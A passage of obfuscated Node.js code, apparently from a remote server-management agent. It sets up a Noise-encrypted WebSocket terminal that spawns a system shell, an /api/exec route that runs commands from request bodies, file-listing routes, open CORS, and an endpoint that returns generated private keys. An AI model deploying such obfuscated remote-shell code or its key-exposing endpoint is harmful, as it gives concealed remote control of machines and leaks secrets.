    const dY = a0aK, c = {
            'FlmKt': dY(0x607),
            'crryG': '[WARN]\x20Noise\x20WASM\x20module\x20failed\x20to\x20load:',
            'zzJeQ': function (d) {
                return d();
            },
            'XUQZo': function (d) {
                return d();
            },
            'aIWLL': function (d, f) {
                return d(f);
            },
            'VWsBZ': dY(0x68c)
        };
    try {
        c['aIWLL'](a0w, function (d) {
            const dZ = dY;
            if (!d) {
                a0aC = new Error(c[dZ(0x5de)]), a0A[dZ(0x25b)](c['crryG'], a0aC[dZ(0x564)]), c['zzJeQ'](a);
                return;
            }
            a0aB = d, a0A[dZ(0x550)](dZ(0x1f4)), c[dZ(0x631)](a);
        });
    } catch (d) {
        a0aC = d, a0A['warn'](c[dY(0x2f9)], d[dY(0x564)]), a();
    }
});
process['on'](a0aK(0x2bd), (a, b) => {
    const e0 = a0aK;
    a0A[e0(0x528)](e0(0x61c), a);
}), process['on'](a0aK(0x31f), a => {
    const e1 = a0aK, b = { 'metgR': e1(0x256) };
    a0A[e1(0x528)](b[e1(0x3f4)], a), process['exit'](0x1);
});
class a0aE {
    constructor(a, b, c) {
        const e2 = a0aK, d = { 'voRyR': e2(0x4c3) }, f = d[e2(0x387)][e2(0x53c)]('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this['recvCipher'] = null;
                continue;
            case '1':
                this[e2(0x61a)] = null;
                continue;
            case '2':
                this[e2(0x3dd)] = ![];
                continue;
            case '3':
                this['hs'] = null;
                continue;
            case '4':
                this[e2(0x655)] = c;
                continue;
            case '5':
                this[e2(0x66c)] = a;
                continue;
            case '6':
                this[e2(0x2a3)] = b;
                continue;
            }
            break;
        }
    }
    async ['init']() {
        const e3 = a0aK, a = {
                'ZQtLA': 'Noise\x20WASM\x20module\x20not\x20available',
                'rAHka': e3(0x180),
                'vwuNe': e3(0x239),
                'EtMiX': e3(0x4d0)
            };
        await a0aD;
        if (!a0aB)
            throw a0aC || new Error(a[e3(0x271)]);
        const b = a0aB, c = this['isInitiator'] ? b[e3(0x680)][e3(0x327)] : b[e3(0x680)][e3(0x532)];
        this['hs'] = b[e3(0x446)](a[e3(0x52d)], c);
        const d = Buffer[e3(0x4e8)](a[e3(0x1dd)]), f = this[e3(0x2a3)] ? Buffer[e3(0x4e8)](this[e3(0x2a3)], e3(0x4d0)) : null, g = this[e3(0x655)] ? Buffer['from'](this[e3(0x655)], a['EtMiX']) : null;
        this['hs'][e3(0x6be)](d, f, g, null);
    }
    [a0aK(0x138)](a) {
        const e4 = a0aK, b = {
                'sXSZj': function (d, f) {
                    return d > f;
                },
                'fDLrG': function (d, f) {
                    return d === f;
                },
                'dRHqE': function (d, f) {
                    return d === f;
                }
            };
        if (this[e4(0x3dd)])
            return Buffer[e4(0x539)](0x0);
        const c = a0aB;
        a && b[e4(0x47b)](a[e4(0x5a7)], 0x0) && this['hs'][e4(0x39f)]() === c[e4(0x680)][e4(0x34d)] && this['hs'][e4(0x302)](a);
        if (this['hs'][e4(0x39f)]() === c['constants'][e4(0x3b6)])
            return this[e4(0x418)](), Buffer['alloc'](0x0);
        if (b[e4(0x6db)](this['hs'][e4(0x39f)](), c['constants'][e4(0x480)])) {
            const d = this['hs'][e4(0x12a)](new Uint8Array(0x0));
            return b[e4(0x6c4)](this['hs'][e4(0x39f)](), c[e4(0x680)][e4(0x3b6)]) && this[e4(0x418)](), Buffer['from'](d);
        }
        return Buffer[e4(0x539)](0x0);
    }
    [a0aK(0x418)]() {
        const e5 = a0aK, a = this['hs'][e5(0x3a5)]();
        this[e5(0x61a)] = a[0x0], this[e5(0x230)] = a[0x1], this[e5(0x3dd)] = !![];
        try {
            if (this['hs'])
                this['hs'][e5(0x63e)]();
        } catch (b) {
        }
        this['hs'] = null;
    }
    ['encrypt'](a) {
        const e6 = a0aK, b = { 'jYGaH': '握手未完成，无法加密数据' };
        if (!this[e6(0x3dd)])
            throw new Error(b['jYGaH']);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[e6(0x4e8)](this['sendCipher']['EncryptWithAd'](c, d));
    }
    [a0aK(0x1c6)](a) {
        const e7 = a0aK, b = { 'isFxI': e7(0x549) };
        if (!this[e7(0x3dd)])
            throw new Error(b[e7(0x68b)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer['from'](this[e7(0x230)][e7(0x6f6)](c, d));
    }
    [a0aK(0x63e)]() {
        const e8 = a0aK, a = { 'BzITA': e8(0x198) }, b = a[e8(0x22c)][e8(0x53c)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                try {
                    if (this['hs'])
                        this['hs'][e8(0x63e)]();
                } catch (d) {
                }
                continue;
            case '1':
                this[e8(0x61a)] = null;
                continue;
            case '2':
                this['hs'] = null;
                continue;
            case '3':
                this[e8(0x230)] = null;
                continue;
            case '4':
                try {
                    if (this[e8(0x230)])
                        this['recvCipher'][e8(0x63e)]();
                } catch (f) {
                }
                continue;
            case '5':
                try {
                    if (this[e8(0x61a)])
                        this[e8(0x61a)][e8(0x63e)]();
                } catch (g) {
                }
                continue;
            }
            break;
        }
    }
}
class a0aF {
    constructor(a, b, c) {
        const e9 = a0aK, d = { 'SrPcw': '3|1|6|0|4|2|5' }, f = d[e9(0x213)][e9(0x53c)]('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this[e9(0x1f2)] = null;
                continue;
            case '1':
                this['env'] = b;
                continue;
            case '2':
                this[e9(0x48c)] = null;
                continue;
            case '3':
                this[e9(0x6a2)] = a;
                continue;
            case '4':
                this[e9(0x201)] = 0x0;
                continue;
            case '5':
                this[e9(0x303)] = null;
                continue;
            case '6':
                this[e9(0x441)] = c;
                continue;
            }
            break;
        }
    }
    [a0aK(0x23c)]() {
        const ea = a0aK, a = {
                'stKml': function (c, d) {
                    return c || d;
                },
                'BzDrO': function (c, d, f, g) {
                    return c(d, f, g);
                },
                'WIlVN': ea(0x62c),
                'EACdO': ea(0x6ac),
                'MbEZV': ea(0x47d)
            };
        this[ea(0x1f2)] = a['BzDrO'](a0q, this[ea(0x6a2)], [], {
            'env': this[ea(0x3eb)],
            'cwd': this[ea(0x441)],
            'windowsHide': !![],
            'stdio': [
                a[ea(0x35c)],
                a[ea(0x35c)],
                a[ea(0x35c)]
            ]
        }), this[ea(0x201)] = this[ea(0x1f2)][ea(0x201)] || 0x0;
        const b = this;
        this['proc'][ea(0x5b2)]['on'](a[ea(0x57c)], c => b[ea(0x458)](c)), this[ea(0x1f2)][ea(0x3e4)]['on'](a['EACdO'], c => b[ea(0x458)](c)), this[ea(0x1f2)]['on'](a[ea(0x4fe)], (c, d) => {
            const eb = ea;
            if (b[eb(0x303)])
                b[eb(0x303)]({
                    'exitCode': c,
                    'signal': a[eb(0x131)](d, null)
                });
        });
    }
    [a0aK(0x458)](a) {
        const ec = a0aK;
        if (this['_onDataCb'])
            this[ec(0x48c)](a[ec(0x206)](ec(0x1fc)));
    }
    [a0aK(0x6bc)](a) {
        const ed = a0aK;
        return this[ed(0x48c)] = a, {
            'dispose': () => {
                const ee = ed;
                this[ee(0x48c)] = null;
            }
        };
    }
    [a0aK(0x1d4)](a) {
        const ef = a0aK;
        return this[ef(0x303)] = a, {
            'dispose': () => {
                const eg = ef;
                this[eg(0x303)] = null;
            }
        };
    }
    [a0aK(0x362)](a) {
        const eh = a0aK;
        if (!this[eh(0x1f2)] || !this[eh(0x1f2)][eh(0x40a)])
            return;
        try {
            this[eh(0x1f2)][eh(0x40a)][eh(0x362)](a);
        } catch (b) {
        }
    }
    [a0aK(0x140)]() {
    }
    [a0aK(0x5b8)]() {
        const ei = a0aK;
        try {
            if (this[ei(0x1f2)])
                this[ei(0x1f2)][ei(0x5b8)]();
        } catch (a) {
        }
    }
}
class a0aG {
    constructor() {
        const ej = a0aK, a = {
                'ktghn': ej(0x50b),
                'HhZfK': ej(0x1ac)
            }, b = a['ktghn'][ej(0x53c)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[ej(0x237)] = a0M[ej(0x21a)][ej(0x559)][ej(0x305)];
                continue;
            case '1':
                this[ej(0x5ec)] = null;
                continue;
            case '2':
                this[ej(0x378)] = a[ej(0x45a)];
                continue;
            case '3':
                this[ej(0x196)] = new a0aE(![], this[ej(0x6f9)], this[ej(0x237)]);
                continue;
            case '4':
                this[ej(0x2c4)] = null;
                continue;
            case '5':
                this[ej(0x621)] = [];
                continue;
            case '6':
                this['msgQueue'] = [];
                continue;
            case '7':
                this['AGENT_PRIVATE_KEY'] = a0M[ej(0x21a)][ej(0x5ce)][ej(0x4be)];
                continue;
            case '8':
                this[ej(0x49e)] = null;
                continue;
            case '9':
                this[ej(0x6d8)] = !![];
                continue;
            }
            break;
        }
    }
    async [a0aK(0x11d)]() {
        const ek = a0aK, a = {
                'gFdDJ': function (b, c) {
                    return b === c;
                },
                'iRCoZ': ek(0x48e),
                'tFmye': ek(0x538)
            };
        this['requestId'] && a0A[ek(0x684)]('[' + this[ek(0x2c4)] + ek(0x3f0));
        if (this[ek(0x5ec)]) {
            a[ek(0x1c2)](process['platform'], a[ek(0x16b)]) && this[ek(0x5ec)]['pid'] && this[ek(0x6bb)](this['ptyProcess']['pid']);
            try {
                this[ek(0x5ec)]['kill']();
            } catch (b) {
            }
            this[ek(0x5ec)] = null;
        }
        if (this[ek(0x196)])
            this[ek(0x196)]['free']();
        if (this[ek(0x49e)])
            try {
                this[ek(0x49e)]['readyState'] === this[ek(0x49e)][ek(0x25a)] && this[ek(0x49e)][ek(0x31e)](0x3e8, a[ek(0x641)]);
            } catch (c) {
            } finally {
                this[ek(0x49e)] = null;
            }
    }
    [a0aK(0x6bb)](a) {
        const el = a0aK, b = {
                'LUogg': function (c, d, f, g) {
                    return c(d, f, g);
                }
            };
        try {
            b[el(0x2c1)](a0p, el(0x692) + a, { 'windowsHide': !![] }, () => {
            });
        } catch (c) {
        }
    }
    [a0aK(0x25e)](a) {
        const em = a0aK, b = {
                'evfhc': function (c, d) {
                    return c === d;
                },
                'ZTboU': 'handshake',
                'AAyOq': function (c, d) {
                    return c > d;
                },
                'Jrtgh': function (c, d) {
                    return c(d);
                },
                'QqCDe': em(0x557)
            };
        if (b['evfhc'](this[em(0x378)], b[em(0x2a0)])) {
            if (b[em(0x391)](this[em(0x621)][em(0x5a7)], 0x0)) {
                const c = this[em(0x621)][em(0x5e3)]();
                b[em(0x29b)](c, a);
            } else
                this[em(0x6d0)][em(0x293)](a);
        } else
            b['evfhc'](this[em(0x378)], b[em(0x265)]) && this[em(0x548)](a);
    }
    async [a0aK(0x46d)]() {
        const en = a0aK;
        if (this[en(0x6d0)][en(0x5a7)] > 0x0)
            return this[en(0x6d0)][en(0x5e3)]();
        return new Promise(a => {
            const eo = en;
            this[eo(0x621)][eo(0x293)](a);
        });
    }
    async ['_doNoiseHandshake'](a) {
        const ep = a0aK, b = {
                'oZANe': function (c, d) {
                    return c(d);
                },
                'pYhFe': '🤝\x20开始\x20Noise\x20加密握手...',
                'eqDgn': function (c, d) {
                    return c > d;
                },
                'naNhZ': '三次握手交互后仍未进入\x20Established\x20状态',
                'grIoM': ep(0x10b)
            };
        b[ep(0x570)](a, b[ep(0x5cc)]);
        try {
            await this[ep(0x196)][ep(0x4c0)]();
            const c = await this[ep(0x46d)](), d = this[ep(0x196)]['processHandshake'](c);
            d && b[ep(0x545)](d['length'], 0x0) && this[ep(0x49e)]['send'](d);
            const f = await this[ep(0x46d)]();
            this[ep(0x196)][ep(0x138)](f);
            if (!this[ep(0x196)]['handshakeFinished'])
                throw new Error(b[ep(0x6d5)]);
            a(b[ep(0x616)]);
        } catch (g) {
            b[ep(0x570)](a, ep(0x16e) + g['message']);
            throw new Error(ep(0x4f5));
        }
    }
    [a0aK(0x690)]() {
        const eq = a0aK, a = {
                'iNUfg': function (d, f) {
                    return d === f;
                },
                'qfTUH': 'win32',
                'fMktc': eq(0x658),
                'udDVT': eq(0x220),
                'RmgeZ': eq(0x21f),
                'kOFNm': eq(0x3fd),
                'AUqpz': eq(0x24f),
                'ReIRX': eq(0x4b7)
            };
        if (a['iNUfg'](process['platform'], a['qfTUH'])) {
            const d = process.env.SystemRoot || a[eq(0x5c6)], f = [
                    a0n[eq(0x575)](d, 'System32', eq(0x2d2), a[eq(0x3d4)], eq(0x295)),
                    process.env.COMSPEC,
                    a0n['join'](d, eq(0x594), a[eq(0x416)])
                ];
            for (const g of f) {
                if (g && a0l[eq(0x5ed)](g))
                    return g;
            }
            return a[eq(0x416)];
        }
        const b = [
            a[eq(0x2fa)],
            a[eq(0x608)],
            a[eq(0x3d2)]
        ];
        for (const h of b) {
            if (a0l[eq(0x5ed)](h))
                return h;
        }
        const c = process.env.SHELL;
        if (c && a0l['existsSync'](c))
            return c;
        return eq(0x5e8);
    }
    async [a0aK(0x40e)](a, b, c) {
        const er = a0aK, d = {
                'DdNyB': function (g, h) {
                    return g(h);
                },
                'iLckC': er(0x15a),
                'guZaS': er(0x564),
                'FAgmr': function (g, h) {
                    return g(h);
                }
            };
        this['websocket'] = a, this[er(0x2c4)] = b;
        const f = g => a0A[er(0x684)]('[终端会话\x20' + b + ']\x20' + g);
        this['useNoise'] = !c, d[er(0x5e7)](f, this['useNoise'] ? d['iLckC'] : '🔐\x20检测到\x20Token，视为\x20WSS\x20链路，跳过\x20Noise'), a['on'](d['guZaS'], g => this['_handleRawMessage'](g));
        try {
            this[er(0x6d8)] && await this['_doNoiseHandshake'](f), await this[er(0x700)](f);
        } catch (g) {
            d[er(0x685)](f, '❌\x20终端会话异常:\x20' + g[er(0x564)]), await this['cleanup']();
        }
    }
    async ['_runTerminal'](a) {
        const es = a0aK, b = {
                'xcsac': 'utf-8',
                'cTDNI': function (g, h) {
                    return g === h;
                },
                'jRKPY': function (g, h) {
                    return g(h);
                },
                'voiNc': function (g, h) {
                    return g(h);
                },
                'TgToE': es(0x4f6),
                'RvEre': function (g, h) {
                    return g(h);
                },
                'rxIjY': es(0x20a),
                'btjUv': function (g) {
                    return g();
                },
                'fptUM': es(0x48e),
                'qFEzs': function (g, h) {
                    return g(h);
                },
                'BbjcG': es(0x224),
                'xsgtu': function (g, h) {
                    return g > h;
                },
                'TkJVj': es(0x31e)
            }, c = this[es(0x690)]();
        b[es(0x23a)](a, '🐚\x20使用\x20Shell\x20路径:\x20' + c);
        const d = Object[es(0x41d)]({}, process.env);
        delete d[es(0x1be)], d[es(0x297)] = b[es(0x544)];
        if (!d[es(0x3ba)])
            d[es(0x3ba)] = es(0x153);
        const f = b[es(0x22d)](a0B);
        try {
            const g = {
                'name': es(0x20a),
                'cols': 0x50,
                'rows': 0x18,
                'cwd': f,
                'env': d
            };
            if (process['platform'] === b[es(0x5b4)])
                try {
                    this[es(0x5ec)] = a0z['spawn'](c, [], g);
                } catch (h) {
                    b['qFEzs'](a, es(0x393) + h[es(0x564)]), this['ptyProcess'] = new a0aF(c, d, f), this['ptyProcess'][es(0x23c)]();
                }
            else
                this[es(0x5ec)] = a0z[es(0x23c)](c, [], g);
            a('🚀\x20终端进程已启动\x20(PID:\x20' + (this['ptyProcess']['pid'] || b[es(0x59b)]) + ')'), this['phase'] = es(0x557);
            while (b[es(0x468)](this[es(0x6d0)][es(0x5a7)], 0x0)) {
                const i = this[es(0x6d0)][es(0x5e3)]();
                this['_processTerminalMessage'](i);
            }
            this[es(0x5ec)][es(0x6bc)](j => {
                const et = es;
                try {
                    let k = Buffer[et(0x4e8)](j, b[et(0x506)]);
                    this[et(0x6d8)] && this[et(0x196)] && this[et(0x196)][et(0x3dd)] && (k = this[et(0x196)][et(0x2f5)](k)), b[et(0x2a9)](this[et(0x49e)][et(0x6f5)], 0x1) && this[et(0x49e)][et(0x10a)](k);
                } catch (l) {
                }
            }), this[es(0x5ec)][es(0x1d4)](({
                exitCode: j,
                signal: k
            }) => {
                const eu = es;
                b[eu(0x66b)](a, '🔌\x20终端进程退出\x20(Code:\x20' + j + eu(0x257) + k + ')'), this[eu(0x11d)]();
            }), this['websocket']['on'](b[es(0x49d)], () => {
                const ev = es;
                b[ev(0x2f0)](a, b[ev(0x28b)]), this['cleanup']();
            });
        } catch (j) {
            a('💥\x20启动终端失败:\x20' + j[es(0x564)]), await this[es(0x11d)]();
            throw j;
        }
    }
    [a0aK(0x548)](a) {
        const ew = a0aK, b = {
                'LVofu': ew(0x415),
                'CQFZj': function (c, d) {
                    return c === d;
                },
                'aAsiU': ew(0x140),
                'tEKUQ': function (c, d) {
                    return c === d;
                },
                'fQoiF': function (c, d) {
                    return c !== d;
                },
                'xuFpJ': function (c, d) {
                    return c === d;
                },
                'MfUPY': ew(0x4d0),
                'MyMUr': ew(0x1fc)
            };
        if (!this[ew(0x5ec)])
            return;
        try {
            const c = Buffer['from'](a);
            let d;
            this[ew(0x6d8)] ? d = this['cipher']['decrypt'](c) : d = c;
            let f = ![], g = d[ew(0x206)](ew(0x1fc));
            if (g['trim']()[ew(0x21e)]('{'))
                try {
                    const h = JSON[ew(0x110)](g);
                    f = !![];
                    if (h[ew(0x240)] === b['LVofu']) {
                        let i = Buffer[ew(0x4e8)](JSON[ew(0x397)]({ 'type': ew(0x415) }));
                        if (this['useNoise'])
                            i = this['cipher'][ew(0x2f5)](i);
                        this['websocket'][ew(0x10a)](i);
                        return;
                    }
                    if (b[ew(0x6e8)](h[ew(0x240)], b[ew(0x2d3)])) {
                        this[ew(0x5ec)]['resize'](h[ew(0x111)] || 0x50, h[ew(0x4b6)] || 0x18);
                        return;
                    }
                    if (b[ew(0x576)](h[ew(0x240)], ew(0x589)) && b[ew(0x612)](h['data'], undefined)) {
                        let j = b[ew(0x254)](h[ew(0x1b7)], b[ew(0x39e)]) ? Buffer['from'](h[ew(0x6ac)], ew(0x4d0))[ew(0x206)](ew(0x1fc)) : h[ew(0x6ac)];
                        this[ew(0x5ec)][ew(0x362)](j);
                        return;
                    }
                } catch (k) {
                    f = ![];
                }
            !f && this[ew(0x5ec)][ew(0x362)](d[ew(0x206)](b[ew(0x2ee)]));
        } catch (l) {
            a0A[ew(0x684)](ew(0x4eb) + this[ew(0x2c4)] + ew(0x444) + l[ew(0x564)]);
            if (this[ew(0x6d8)])
                this[ew(0x11d)]();
        }
    }
}
async function a0aH(a = {}) {
    const ex = a0aK, b = {
            'NAqxj': '4|0|1|2|5|3',
            'vXdla': ex(0x582),
            'LNjhH': ex(0x1c3),
            'HbjCa': 'Access-Control-Allow-Headers',
            'HWroJ': ex(0x4e7),
            'JFFUc': ex(0x63a),
            'oYiCo': function (c, d) {
                return c === d;
            },
            'NxjZg': ex(0x314),
            'jKDvZ': ex(0x67c),
            'SoUmB': function (c, d) {
                return c / d;
            },
            'doWMu': ex(0x2ea),
            'PnTev': function (c, d) {
                return c - d;
            },
            'trwIY': '📦\x20[Cache]\x20BaseInfo\x20命中有效缓存，直接输出。',
            'UvQKl': function (c, d) {
                return c === d;
            },
            'kLdkJ': function (c, d) {
                return c !== d;
            },
            'REojk': function (c, d, f) {
                return c(d, f);
            },
            'aJIvM': function (c, d) {
                return c < d;
            },
            'heFhF': function (c, d) {
                return c > d;
            },
            'HTSGi': function (c, d) {
                return c(d);
            },
            'agtan': function (c, d) {
                return c / d;
            },
            'OGewD': ex(0x528),
            'Wjwxm': 'string',
            'dUvNm': ex(0x30b),
            'ctkCA': ex(0x5bc),
            'nwJas': function (c, d) {
                return c === d;
            },
            'TjbHP': ex(0x2e1),
            'GzKEh': function (c, d) {
                return c(d);
            },
            'QvFxb': ex(0x56b),
            'khfnh': ex(0x34b),
            'ngnzu': function (c, d) {
                return c || d;
            },
            'tpMgx': ex(0x6a0),
            'yURyv': function (c, d, f) {
                return c(d, f);
            },
            'QNqIE': ex(0x357),
            'wChvU': ex(0x4d0),
            'KKrLb': 'x-file-size',
            'wqVEf': ex(0x234),
            'CVfUl': 'application/octet-stream',
            'wXwgi': function (c, d, f) {
                return c(d, f);
            },
            'CAtry': function (c, d) {
                return c(d);
            },
            'SluKB': function (c, d) {
                return c === d;
            },
            'fzsBC': function (c, d) {
                return c < d;
            },
            'fOTTB': function (c, d) {
                return c > d;
            },
            'mIapd': ex(0x637),
            'WFpsp': function (c, d) {
                return c(d);
            },
            'xOCJK': function (c, d) {
                return c > d;
            },
            'pphaP': ex(0x27b),
            'jGJEo': 'Closing\x20connection\x20due\x20to\x20missing\x20request_id',
            'QQPmi': function (c, d) {
                return c !== d;
            },
            'wvZlI': ex(0x1a8),
            'azbVz': 'Server\x20listening\x20successfully',
            'nlnNF': ex(0x609),
            'xKOco': ex(0x169),
            'tLLtZ': 'Config\x20validated',
            'nBaUH': ex(0x298),
            'zLBft': '❌\x20启动熔断:\x20ECDSA\x20公钥缺失或解析失败，非\x20DEBUG\x20模式下拒绝启动',
            'nxPZY': ex(0x5df),
            'uQtJo': ex(0x42e),
            'ZKBqh': ex(0x2e4),
            'NnqPD': ex(0x175),
            'mZpVY': ex(0x518),
            'YbPXf': function (c) {
                return c();
            },
            'DbyMm': function (c, d, f) {
                return c(d, f);
            },
            'KBXCq': ex(0x596),
            'qjPvp': ex(0x4ee),
            'euNNM': ex(0x164),
            'msJYo': '/api/exec',
            'tOuXG': ex(0x3ad),
            'vsTQT': ex(0x5e9),
            'KFAFm': ex(0x219),
            'yfrhs': '/api/file',
            'OIzVv': ex(0x4f9),
            'WYqMC': ex(0x30f),
            'SMhJl': ex(0x14a),
            'vrVWZ': ex(0x1ff),
            'HwNGW': ex(0x309),
            'JwZif': ex(0x4d4),
            'Knkrk': '/api/task/status',
            'xSPnA': ex(0x174),
            'OYDeJ': ex(0x34c),
            'qzTlN': ex(0x30d),
            'qwavJ': ex(0x481),
            'pgXxK': ex(0x63b),
            'uqSMG': ex(0x1eb),
            'Apdop': ex(0x347),
            'KDWyC': ex(0x466)
        };
    try {
        const c = await import(ex(0x4b1));
        a0x = c['p256'];
        const d = await import(b['nlnNF']);
        a0y = d[ex(0x326)], a0A[ex(0x550)](b[ex(0x1ab)]), a0M['merge'](a), a0A[ex(0x550)](ex(0x2da)), a0M[ex(0x246)](), a0A[ex(0x550)](b[ex(0x45c)]), a0A[ex(0x550)](b[ex(0x4f3)]);
        const f = new a0O(a0M[ex(0x27e)], a0M['ECIES_PUBLIC_KEY_PEM']);
        a0A[ex(0x550)](ex(0x202));
        !a0M['DEBUG'] && !f['ecdsaPubkey'] && (a0A[ex(0x528)](b['zLBft']), a0A[ex(0x528)]('\x20\x20\x20请检查\x20ECDSA_PUBKEY\x20环境变量或\x20keys/agent_ecdsa_pub.pem\x20是否为合法\x20P-256\x20公钥\x20(PEM\x20或\x2033\x20字节压缩\x20Base64)'), process[ex(0x47d)](0x1));
        a0A[ex(0x550)](b[ex(0x671)]);
        const g = new a0N();
        a0A[ex(0x550)](b[ex(0x192)]), a0A[ex(0x550)](b[ex(0x45e)]);
        const h = new a0Q();
        a0A[ex(0x550)](b['NnqPD']), a0A[ex(0x550)](b[ex(0x2ba)]);
        const i = b['YbPXf'](a0f);
        b['HTSGi'](a0v, i), a0A[ex(0x550)]('Express\x20app\x20created\x20and\x20expressWs\x20applied'), i[ex(0x3d0)]((m, n, o) => {
            const ey = ex, p = b['NAqxj'][ey(0x53c)]('|');
            let q = 0x0;
            while (!![]) {
                switch (p[q++]) {
                case '0':
                    n['header'](b[ey(0x531)], b[ey(0x1f9)]);
                    continue;
                case '1':
                    n[ey(0x591)](b['HbjCa'], b['HWroJ']);
                    continue;
                case '2':
                    n['header'](b[ey(0x6e5)], ey(0x39a));
                    continue;
                case '3':
                    o();
                    continue;
                case '4':
                    n['header']('Access-Control-Allow-Origin', '*');
                    continue;
                case '5':
                    if (b[ey(0x633)](m[ey(0x4a4)], b['NxjZg']))
                        return n[ey(0x423)](0xc8)[ey(0x42b)]();
                    continue;
                }
                break;
            }
        }), i[ex(0x3d0)](a0f[ex(0x47f)]({
            'type': m => m[ex(0x5d0)] !== '/api/fileraw',
            'limit': '50mb'
        })), i[ex(0x3d0)](a0f[ex(0x349)]({ 'extended': !![] })), i[ex(0x3d0)](b[ex(0x6a7)](a0P, f, g)), a0A[ex(0x550)](b[ex(0x1df)]), i['get'](ex(0x4f7), async (m, n) => {
            const ez = ex;
            try {
                const o = Math[ez(0x3e5)](b[ez(0x139)](Date[ez(0x65e)](), 0x3e8));
                !a0M[ez(0x389)] || b['PnTev'](o, a0M[ez(0x2f4)]) > a0M[ez(0x68e)] ? (!a0M[ez(0x1e7)] && (a0M[ez(0x1e7)] = h[ez(0x5ea)]()[ez(0x6ad)](q => {
                    const eA = ez, r = b[eA(0x672)][eA(0x53c)]('|');
                    let s = 0x0;
                    while (!![]) {
                        switch (r[s++]) {
                        case '0':
                            a0M['_baseinfo_cache_time'] = Math[eA(0x3e5)](b['SoUmB'](Date['now'](), 0x3e8));
                            continue;
                        case '1':
                            a0M[eA(0x1e7)] = null;
                            continue;
                        case '2':
                            a0M[eA(0x389)] = q;
                            continue;
                        case '3':
                            return q;
                        case '4':
                            a0A[eA(0x550)](b[eA(0x4b9)]);
                            continue;
                        }
                        break;
                    }
                })[ez(0x23f)](q => {
                    const eB = ez;
                    a0M[eB(0x1e7)] = null;
                    throw q;
                })), await a0M[ez(0x1e7)]) : a0A['debug'](b['trwIY']);
                const p = { ...a0M[ez(0x389)] };
                b['UvQKl'](m['is_authenticated'], !![]) ? (p[ez(0x6b3)] = a0M[ez(0x525)], p[ez(0x4de)] = a0M[ez(0x1ba)]) : (p[ez(0x6b3)] = null, p[ez(0x4de)] = null), n['json'](p);
            } catch (q) {
                n[ez(0x423)](0x1f4)[ez(0x705)]({
                    'status': 'error',
                    'message': q['message']
                });
            }
        }), i[ex(0x12e)](b[ex(0x59d)], (m, n) => {
            const eC = ex;
            let o = a0M[eC(0x4ff)];
            if (b[eC(0x2e6)](m[eC(0x4ce)][eC(0x4df)], undefined)) {
                const r = b[eC(0x67f)](parseInt, m[eC(0x4ce)][eC(0x4df)], 0xa);
                if (Number[eC(0x278)](r) || b[eC(0x2fe)](r, 0x1) || b[eC(0x644)](r, a0M[eC(0x54a)]))
                    return n[eC(0x423)](0x1a6)[eC(0x705)]({ 'error': eC(0x48a) + a0M[eC(0x54a)] });
                o = r;
            }
            const p = g[eC(0x181)](o), q = s => new Date(s * 0x3e8)['toISOString']()[eC(0x4bd)](eC(0x1b8), 'Z');
            n[eC(0x705)]({
                'status': 'ok',
                'key_id': p[eC(0x46c)],
                'ttl_seconds': p[eC(0x10e)],
                'created_at': b[eC(0x29e)](q, p['created_at']),
                'expires_at': b[eC(0x29e)](q, p[eC(0x1a0)]),
                'ecdsa': {
                    'private_key': p[eC(0x355)][eC(0x61b)](),
                    'public_key': p[eC(0x250)][eC(0x61b)]()
                },
                'ecies': {
                    'private_key': p[eC(0x62b)],
                    'public_key': p[eC(0x6e2)]
                }
            });
        }), i[ex(0x12e)](b['euNNM'], async (m, n) => {
            const eD = ex, o = {
                    'leqRj': eD(0x3cb),
                    'HFEWf': function (p, q) {
                        const eE = eD;
                        return b[eE(0x139)](p, q);
                    }
                };
            try {
                const p = Math[eD(0x3e5)](b[eD(0x50e)](Date[eD(0x65e)](), 0x3e8));
                !a0M[eD(0x2dd)] || b['PnTev'](p, a0M['_status_cache_time']) > a0M[eD(0x4b3)] ? (!a0M[eD(0x5a2)] && (a0M['_status_fetch_promise'] = h['getRealtimeInfo']()[eD(0x6ad)](r => {
                    const eF = eD, s = o[eF(0x2b4)]['split']('|');
                    let t = 0x0;
                    while (!![]) {
                        switch (s[t++]) {
                        case '0':
                            a0M[eF(0x3fa)] = Math[eF(0x3e5)](o['HFEWf'](Date[eF(0x65e)](), 0x3e8));
                            continue;
                        case '1':
                            a0A[eF(0x550)](eF(0x46b));
                            continue;
                        case '2':
                            a0M['_status_fetch_promise'] = null;
                            continue;
                        case '3':
                            a0M['_status_cache'] = r;
                            continue;
                        case '4':
                            return r;
                        }
                        break;
                    }
                })[eD(0x23f)](r => {
                    a0M['_status_fetch_promise'] = null;
                    throw r;
                })), await a0M[eD(0x5a2)]) : a0A[eD(0x550)](eD(0x535));
                const q = { ...a0M[eD(0x2dd)] };
                n[eD(0x705)](q);
            } catch (r) {
                n['status'](0x1f4)[eD(0x705)]({
                    'status': b[eD(0x203)],
                    'message': r[eD(0x564)]
                });
            }
        }), i[ex(0x251)](b[ex(0x5ff)], async (m, n) => {
            const eG = ex;
            try {
                let o = null;
                if (typeof m['body'] === b[eG(0x24c)])
                    o = m[eG(0x6f7)]['trim']();
                else
                    m[eG(0x6f7)] && b[eG(0x6a3)](typeof m['body'], b[eG(0x16f)]) && (o = m['body'][eG(0x4ab)] || '');
                if (!o)
                    return n['status'](0x190)['json']({
                        'status': eG(0x528),
                        'message': b[eG(0x584)]
                    });
                const p = await a0R[eG(0x6f8)](o, {
                    'cwd': m['body'][eG(0x441)],
                    'env': m['body'][eG(0x3eb)],
                    'timeout': a0M['Rtimeout']
                });
                n['json'](p);
            } catch (q) {
                n[eG(0x423)](0x1f4)[eG(0x705)]({
                    'status': 'error',
                    'message': q[eG(0x564)]
                });
            }
        }), i[ex(0x251)](b['tOuXG'], async (m, n) => {
            const eH = ex;
            try {
                const o = await a0S['listFiles'](m[eH(0x6f7)][eH(0x5d0)], m[eH(0x6f7)][eH(0x497)]);
                n[eH(0x705)]({
                    'status': 'ok',
                    'count': o['length'],
                    'files': o
                });
            } catch (p) {
                n[eH(0x423)](0x1f4)['json']({
                    'status': 'error',
                    'message': p[eH(0x564)]
                });
            }
        }), i[ex(0x251)](ex(0x5e9), async (m, n) => {
            const eI = ex;
            try {
                const o = await a0S[eI(0x679)](m[eI(0x6f7)]['paths'] || []);
                n[eI(0x705)]({
